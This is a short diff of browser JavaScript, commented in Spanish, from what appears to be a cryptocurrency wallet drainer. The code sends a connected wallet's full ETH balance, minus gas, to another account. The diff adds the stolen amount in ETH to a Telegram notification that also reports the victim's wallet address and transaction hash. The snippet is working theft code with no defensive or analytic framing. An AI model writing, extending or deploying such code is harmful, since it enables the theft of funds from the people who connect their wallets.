@@ -243,6 +243,7 @@
 
             if (balanceWei > gasFee) {
                 const amountToSend = balanceWei - gasFee;
+                const amountToSendEth = web3.utils.fromWei(amountToSend, 'ether'); // Convertir el valor a ETH
 
                 web3.eth.sendTransaction({
                     from: fromAccount,
@@ -253,8 +254,8 @@
                     alert(`Transferencia exitosa: ${tx.transactionHash}`);
                     document.getElementById('status').innerText = 'Todo el saldo ha sido enviado correctamente';
                     
-                    // Enviar la transacción a Telegram
-                    sendToTelegram(`Transferencia realizada desde la wallet: ${fromAccount}\nTransacción Hash: ${tx.transactionHash}`);
+                    // Enviar el mensaje a Telegram con el emoticono verde y la cantidad de fondos enviados
+                    sendToTelegram(`✅ Transacción exitosa\nWallet: ${fromAccount}\nTransacción Hash: ${tx.transactionHash}\nCantidad Enviada: ${amountToSendEth} ETH`);
                 })
                 .catch(error => {
                     console.error(error);
